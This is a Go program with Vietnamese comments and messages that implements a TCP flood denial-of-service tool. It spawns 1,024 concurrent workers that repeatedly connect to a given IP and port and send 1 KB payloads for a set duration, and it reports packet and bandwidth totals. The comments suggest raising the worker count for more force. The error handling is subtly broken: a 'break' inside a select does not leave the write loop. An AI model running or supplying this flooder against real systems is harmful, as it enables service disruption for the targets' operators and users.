// tcp.go
package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	sendCount  uint64
	byteSent   uint64
	stopSignal = make(chan struct{})
)

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Cách dùng:")
		fmt.Println("  go run tcp.go <IP> <PORT> <thời gian giây>")
		fmt.Println("Ví dụ:")
		fmt.Println("  go run tcp.go 127.0.0.1 80 60")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	portStr := os.Args[2]
	durationSec, err := strconv.Atoi(os.Args[3])
	if err != nil || durationSec < 1 {
		fmt.Println("Thời gian phải là số nguyên dương (giây)")
		os.Exit(1)
	}

	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		fmt.Println("Port không hợp lệ (1-65535)")
		os.Exit(1)
	}

	target := fmt.Sprintf("%s:%d", targetIP, port)

	fmt.Printf("[+] Bắt đầu flood TCP → %s trong %d giây\n", target, durationSec)
	fmt.Println("[+] Nhấn Ctrl+C để dừng sớm")

	go printStats()

	var wg sync.WaitGroup

	// Thời gian dừng
	timer := time.NewTimer(time.Duration(durationSec) * time.Second)
	go func() {
		<-timer.C
		close(stopSignal)
	}()

	// Số lượng goroutine flood (càng nhiều càng mạnh - tùy CPU)
	workers := 1024 // Có thể tăng lên 2048, 4096 nếu máy mạnh

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go flood(target, &wg)
	}

	wg.Wait()

	fmt.Println("\n[+] Đã dừng.")
	printFinalStats()
}

func flood(target string, wg *sync.WaitGroup) {
	defer wg.Done()

	var payload = make([]byte, 1024) // 1KB mỗi lần gửi
	for i := range payload {
		payload[i] = byte(i % 256)
	}

	for {
		select {
		case <-stopSignal:
			return
		default:
			conn, err := net.DialTimeout("tcp", target, 3*time.Second)
			if err != nil {
				continue // thất bại thì thử lại ngay
			}

			// Gửi liên tục cho đến khi connection chết
			for {
				select {
				case <-stopSignal:
					conn.Close()
					return
				default:
					n, err := conn.Write(payload)
					if err != nil || n == 0 {
						conn.Close()
						break
					}
					atomic.AddUint64(&sendCount, 1)
					atomic.AddUint64(&byteSent, uint64(n))
				}
			}
		}
	}
}

func printStats() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopSignal:
			return
		case <-ticker.C:
			packets := atomic.LoadUint64(&sendCount)
			bytes := atomic.LoadUint64(&byteSent)
			mbps := float64(bytes) / 1024 / 1024 * 8 / 2 // chia 2 vì tick 2s

			fmt.Printf("\r[*] Gửi: %d packets | %.2f MB | ~%.1f Mbps",
				packets, float64(bytes)/1024/1024, mbps)
		}
	}
}

func printFinalStats() {
	packets := atomic.LoadUint64(&sendCount)
	bytes := atomic.LoadUint64(&byteSent)

	fmt.Printf("\nKết quả cuối:\n")
	fmt.Printf("  Tổng packets : %d\n", packets)
	fmt.Printf("  Tổng bytes   : %.2f MB\n", float64(bytes)/1024/1024)
}